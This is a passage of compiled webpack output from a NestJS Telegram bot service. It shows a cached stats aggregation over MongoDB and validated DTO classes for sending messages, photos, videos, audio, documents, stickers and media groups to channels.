                formData.append('title', options.title);
        }
        if (options.thumbnail) {
            if (Buffer.isBuffer(options.thumbnail)) {
                formData.append('thumbnail', options.thumbnail, 'thumbnail.jpg');
            }
            else {
                formData.append('thumbnail', options.thumbnail);
            }
        }
        if (method === 'sendDocument' && options.disableContentTypeDetection) {
            formData.append('disable_content_type_detection', 'true');
        }
        if (method === 'sendVoice' || method === 'sendVideoNote') {
            if (options.duration)
                formData.append('duration', options.duration.toString());
        }
        if (method === 'sendVideoNote' && options.length) {
            formData.append('length', options.length.toString());
        }
        if (method === 'sendSticker' && options.emoji) {
            formData.append('emoji', options.emoji);
        }
    }
    async getBotStatsByCategory(category) {
        const cacheKey = `stats:${category}`;
        const cachedStats = this.cache.get(cacheKey);
        if (cachedStats) {
            return cachedStats;
        }
        console.warn(`Cache miss for stats: ${category}`);
        const stats = await this.botModel.aggregate([
            { $match: { category } },
            {
                $group: {
                    _id: '$category',
                    totalBots: { $sum: 1 },
                    totalMessagesSent: { $sum: '$stats.messagesSent' },
                    totalPhotosSent: { $sum: '$stats.photosSent' },
                    totalVideosSent: { $sum: '$stats.videosSent' },
                    totalDocumentsSent: { $sum: '$stats.documentsSent' },
                    totalAudiosSent: { $sum: '$stats.audiosSent' },
                    totalMediaGroupsSent: { $sum: '$stats.mediaGroupsSent' },
                    avgFailedAttempts: { $avg: '$failedAttempts' }
                }
            }
        ]);
        const result = stats[0] || { _id: category, totalBots: 0 };
        this.cache.set(cacheKey, result);
        return result;
    }
};
exports.BotsService = BotsService;
exports.BotsService = BotsService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(bot_schema_1.Bot.name)),
    __metadata("design:paramtypes", [mongoose_2.Model])
], BotsService);


/***/ }),

/***/ "./src/components/bots/dto/create-bot.dto.ts":
/*!***************************************************!*\
  !*** ./src/components/bots/dto/create-bot.dto.ts ***!
  \***************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateBotDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const bots_service_1 = __webpack_require__(/*! ../bots.service */ "./src/components/bots/bots.service.ts");
class CreateBotDto {
}
exports.CreateBotDto = CreateBotDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Telegram bot token',
        example: '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz'
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateBotDto.prototype, "token", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Channel category the bot belongs to',
        enum: bots_service_1.ChannelCategory,
        example: bots_service_1.ChannelCategory.CLIENT_UPDATES
    }),
    (0, class_validator_1.IsEnum)(bots_service_1.ChannelCategory),
    __metadata("design:type", String)
], CreateBotDto.prototype, "category", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Channel ID where bot will post messages',
        example: '-1001234567890'
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateBotDto.prototype, "channelId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Optional description of the bot',
        required: false,
        example: 'Bot for sending client updates'
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], CreateBotDto.prototype, "description", void 0);


/***/ }),

/***/ "./src/components/bots/dto/index.ts":
/*!******************************************!*\
  !*** ./src/components/bots/dto/index.ts ***!
  \******************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./create-bot.dto */ "./src/components/bots/dto/create-bot.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./send-message.dto */ "./src/components/bots/dto/send-message.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./media.dto */ "./src/components/bots/dto/media.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./media-extras.dto */ "./src/components/bots/dto/media-extras.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./media-group.dto */ "./src/components/bots/dto/media-group.dto.ts"), exports);


/***/ }),

/***/ "./src/components/bots/dto/media-extras.dto.ts":
/*!*****************************************************!*\
  !*** ./src/components/bots/dto/media-extras.dto.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SendStickerDto = exports.StickerOptionsDto = exports.SendAnimationDto = exports.AnimationOptionsDto = exports.SendVoiceDto = exports.VoiceOptionsDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
const media_dto_1 = __webpack_require__(/*! ./media.dto */ "./src/components/bots/dto/media.dto.ts");
class VoiceOptionsDto extends media_dto_1.MediaOptionsDto {
}
exports.VoiceOptionsDto = VoiceOptionsDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Duration of the voice message in seconds',
        required: false,
    }),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Number)
], VoiceOptionsDto.prototype, "duration", void 0);
class SendVoiceDto {
}
exports.SendVoiceDto = SendVoiceDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Voice message URL or file ID',
        example: 'https://example.com/voice.ogg',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SendVoiceDto.prototype, "voice", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Voice sending options',
        required: false,
        type: () => VoiceOptionsDto,
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => VoiceOptionsDto),
    __metadata("design:type", VoiceOptionsDto)
], SendVoiceDto.prototype, "options", void 0);
class AnimationOptionsDto extends media_dto_1.MediaOptionsDto {
}
exports.AnimationOptionsDto = AnimationOptionsDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Duration of the animation in seconds', required: false }),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Number)
], AnimationOptionsDto.prototype, "duration", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Animation width', required: false }),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Number)
], AnimationOptionsDto.prototype, "width", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Animation height', required: false }),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Number)
], AnimationOptionsDto.prototype, "height", void 0);
class SendAnimationDto {
}
exports.SendAnimationDto = SendAnimationDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Animation (GIF/MP4) URL or file ID',
        example: 'https://example.com/animation.gif',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SendAnimationDto.prototype, "animation", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Animation sending options',
        required: false,
        type: () => AnimationOptionsDto,
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => AnimationOptionsDto),
    __metadata("design:type", AnimationOptionsDto)
], SendAnimationDto.prototype, "options", void 0);
class StickerOptionsDto extends media_dto_1.MediaOptionsDto {
}
exports.StickerOptionsDto = StickerOptionsDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Emoji associated with the sticker',
        required: false,
        example: '',
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], StickerOptionsDto.prototype, "emoji", void 0);
class SendStickerDto {
}
exports.SendStickerDto = SendStickerDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Sticker URL or file ID',
        example: 'https://example.com/sticker.webp',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SendStickerDto.prototype, "sticker", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Sticker sending options',
        required: false,
        type: () => StickerOptionsDto,
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => StickerOptionsDto),
    __metadata("design:type", StickerOptionsDto)
], SendStickerDto.prototype, "options", void 0);


/***/ }),

/***/ "./src/components/bots/dto/media-group.dto.ts":
/*!****************************************************!*\
  !*** ./src/components/bots/dto/media-group.dto.ts ***!
  \****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SendMediaGroupDto = exports.MediaGroupItemDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
const media_dto_1 = __webpack_require__(/*! ./media.dto */ "./src/components/bots/dto/media.dto.ts");
class MediaGroupItemDto {
}
exports.MediaGroupItemDto = MediaGroupItemDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Type of media',
        enum: ['photo', 'video', 'audio', 'document'],
        example: 'photo'
    }),
    (0, class_validator_1.IsEnum)(['photo', 'video', 'audio', 'document']),
    __metadata("design:type", String)
], MediaGroupItemDto.prototype, "type", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Media URL or file ID',
        example: 'https://example.com/media.jpg'
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], MediaGroupItemDto.prototype, "media", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Caption for the media',
        required: false
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], MediaGroupItemDto.prototype, "caption", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Parse mode for caption',
        enum: ['HTML', 'Markdown', 'MarkdownV2'],
        required: false
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], MediaGroupItemDto.prototype, "parseMode", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Apply spoiler animation to media',
        required: false
    }),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], MediaGroupItemDto.prototype, "hasSpoiler", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'File extension when sending as buffer',
        required: false
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], MediaGroupItemDto.prototype, "extension", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Duration for video/audio in seconds',
        required: false
    }),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Number)
], MediaGroupItemDto.prototype, "duration", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Width for video',
        required: false
    }),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Number)
], MediaGroupItemDto.prototype, "width", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Height for video',
        required: false
    }),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Number)
], MediaGroupItemDto.prototype, "height", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether video supports streaming',
        required: false
    }),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], MediaGroupItemDto.prototype, "supportsStreaming", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Performer name for audio',
        required: false
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], MediaGroupItemDto.prototype, "performer", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Title for audio',
        required: false
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], MediaGroupItemDto.prototype, "title", void 0);
class SendMediaGroupDto {
}
exports.SendMediaGroupDto = SendMediaGroupDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Array of media items to send',
        type: [MediaGroupItemDto]
    }),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.ValidateNested)({ each: true }),
    (0, class_transformer_1.Type)(() => MediaGroupItemDto),
    __metadata("design:type", Array)
], SendMediaGroupDto.prototype, "media", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Media group sending options',
        required: false,
        type: () => media_dto_1.MediaOptionsDto
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => media_dto_1.MediaOptionsDto),
    __metadata("design:type", media_dto_1.MediaOptionsDto)
], SendMediaGroupDto.prototype, "options", void 0);


/***/ }),

/***/ "./src/components/bots/dto/media.dto.ts":
/*!**********************************************!*\
  !*** ./src/components/bots/dto/media.dto.ts ***!
  \**********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SendDocumentDto = exports.SendAudioDto = exports.SendVideoDto = exports.SendPhotoDto = exports.DocumentOptionsDto = exports.AudioOptionsDto = exports.VideoOptionsDto = exports.MediaOptionsDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
class MediaOptionsDto {
}
exports.MediaOptionsDto = MediaOptionsDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Parse mode for the caption',
        enum: ['HTML', 'MarkdownV2', 'Markdown'],
        required: false
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], MediaOptionsDto.prototype, "parseMode", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Caption text',
        required: false
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], MediaOptionsDto.prototype, "caption", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Disable notification',
        required: false
    }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], MediaOptionsDto.prototype, "disableNotification", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Message ID to reply to',
        required: false
    }),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Number)
], MediaOptionsDto.prototype, "replyToMessageId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Allow sending without reply',
        required: false
    }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], MediaOptionsDto.prototype, "allowSendingWithoutReply", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Protect content',
        required: false
    }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], MediaOptionsDto.prototype, "protectContent", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Apply spoiler animation',
        required: false
    }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], MediaOptionsDto.prototype, "hasSpoiler", void 0);
class VideoOptionsDto extends MediaOptionsDto {
}
exports.VideoOptionsDto = VideoOptionsDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Duration of the video in seconds',
        required: false
    }),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Number)
], VideoOptionsDto.prototype, "duration", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Video width',
        required: false
    }),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Number)
], VideoOptionsDto.prototype, "width", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Video height',
        required: false
    }),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Number)
], VideoOptionsDto.prototype, "height", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Pass True if the uploaded video is suitable for streaming',
        required: false
    }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], VideoOptionsDto.prototype, "supportsStreaming", void 0);
class AudioOptionsDto extends MediaOptionsDto {
}
exports.AudioOptionsDto = AudioOptionsDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Duration of the audio in seconds',
        required: false
    }),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Number)
], AudioOptionsDto.prototype, "duration", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Performer name',
        required: false
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], AudioOptionsDto.prototype, "performer", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Track title',
        required: false
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], AudioOptionsDto.prototype, "title", void 0);
class DocumentOptionsDto extends MediaOptionsDto {
}
exports.DocumentOptionsDto = DocumentOptionsDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Disables automatic content type detection',
        required: false
    }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], DocumentOptionsDto.prototype, "disableContentTypeDetection", void 0);
class SendPhotoDto {
}
exports.SendPhotoDto = SendPhotoDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Photo URL or file ID',
        example: 'https://example.com/photo.jpg'
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SendPhotoDto.prototype, "photo", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Photo sending options',
        required: false,
        type: () => MediaOptionsDto
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => MediaOptionsDto),
    __metadata("design:type", MediaOptionsDto)
], SendPhotoDto.prototype, "options", void 0);
class SendVideoDto {
}
exports.SendVideoDto = SendVideoDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Video URL or file ID',
        example: 'https://example.com/video.mp4'
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SendVideoDto.prototype, "video", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Video sending options',
        required: false,
        type: () => VideoOptionsDto
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => VideoOptionsDto),
    __metadata("design:type", VideoOptionsDto)
], SendVideoDto.prototype, "options", void 0);
class SendAudioDto {
}
exports.SendAudioDto = SendAudioDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Audio URL or file ID',
        example: 'https://example.com/audio.mp3'
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SendAudioDto.prototype, "audio", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Audio sending options',
        required: false,
        type: () => AudioOptionsDto
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => AudioOptionsDto),
    __metadata("design:type", AudioOptionsDto)
], SendAudioDto.prototype, "options", void 0);
class SendDocumentDto {
}
exports.SendDocumentDto = SendDocumentDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Document URL or file ID',
        example: 'https://example.com/document.pdf'
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SendDocumentDto.prototype, "document", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Document sending options',
        required: false,
        type: () => DocumentOptionsDto
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => DocumentOptionsDto),
    __metadata("design:type", DocumentOptionsDto)
], SendDocumentDto.prototype, "options", void 0);


/***/ }),

/***/ "./src/components/bots/dto/send-message.dto.ts":
/*!*****************************************************!*\
  !*** ./src/components/bots/dto/send-message.dto.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SendMessageDto = exports.SendMessageOptionsDto = exports.LinkPreviewOptionsDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
class LinkPreviewOptionsDto {
}
exports.LinkPreviewOptionsDto = LinkPreviewOptionsDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Disables link preview',
        required: false
    }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], LinkPreviewOptionsDto.prototype, "isDisabled", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'URL to use for the link preview',
        required: false
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], LinkPreviewOptionsDto.prototype, "url", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Prefer small media',
        required: false
    }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], LinkPreviewOptionsDto.prototype, "preferSmallMedia", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Prefer large media',
        required: false
    }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], LinkPreviewOptionsDto.prototype, "preferLargeMedia", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Show preview above text',
        required: false
    }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], LinkPreviewOptionsDto.prototype, "showAboveText", void 0);
class SendMessageOptionsDto {
}
exports.SendMessageOptionsDto = SendMessageOptionsDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Parse mode for the message',
        enum: ['HTML', 'MarkdownV2', 'Markdown'],
        required: false
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], SendMessageOptionsDto.prototype, "parseMode", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Disable web page preview',
        required: false
    }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], SendMessageOptionsDto.prototype, "disableWebPagePreview", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Disable notification',
        required: false
    }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], SendMessageOptionsDto.prototype, "disableNotification", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Message ID to reply to',
        required: false
    }),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Number)
], SendMessageOptionsDto.prototype, "replyToMessageId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Allow sending without reply',
        required: false
    }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], SendMessageOptionsDto.prototype, "allowSendingWithoutReply", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Protect content',
        required: false
    }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], SendMessageOptionsDto.prototype, "protectContent", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Link preview options',
        required: false,
        type: () => LinkPreviewOptionsDto
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => LinkPreviewOptionsDto),
    __metadata("design:type", LinkPreviewOptionsDto)
], SendMessageOptionsDto.prototype, "linkPreviewOptions", void 0);
class SendMessageDto {
}
exports.SendMessageDto = SendMessageDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Message text to send',
        example: 'Hello, this is a test message!'
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SendMessageDto.prototype, "message", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Message sending options',
        required: false,
        type: () => SendMessageOptionsDto
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => SendMessageOptionsDto),
    __metadata("design:type", SendMessageOptionsDto)
], SendMessageDto.prototype, "options", void 0);


/***/ }),

/***/ "./src/components/bots/index.ts":
/*!**************************************!*\
  !*** ./src/components/bots/index.ts ***!
  \**************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
